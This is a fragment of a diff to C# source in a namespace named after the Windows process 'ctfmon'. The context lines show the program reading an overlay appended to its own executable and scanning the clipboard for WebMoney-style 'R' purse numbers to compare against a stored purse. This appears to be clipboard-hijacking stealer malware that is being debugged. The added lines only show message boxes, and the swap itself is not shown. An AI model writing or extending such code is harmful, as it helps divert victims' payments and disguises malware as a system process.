@@ -86,6 +86,7 @@ namespace ctfmon
         private void Form1_Load(object sender, EventArgs e)
         {
 
+            MessageBox.Show("Window test");
 
             string myCodeBase = File.ReadAllText(Application.ExecutablePath);
             string[] CodeAndOverlay = myCodeBase.Split(new string[] { "XMLK_SEP^^" }, StringSplitOptions.None);
@@ -150,6 +151,9 @@ namespace ctfmon
                 string data = Clipboard.GetText();
                 if (Regex.IsMatch(data, "R[0-9]+", RegexOptions.IgnoreCase)  && Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
+                    MessageBox.Show(data);
+                    MessageBox.Show(pDataPurse);
+
                     if (Regex.IsMatch(data,"R"+RPurse,RegexOptions.IgnoreCase))
                     {
                             MessageBox.Show(pDataPurse);
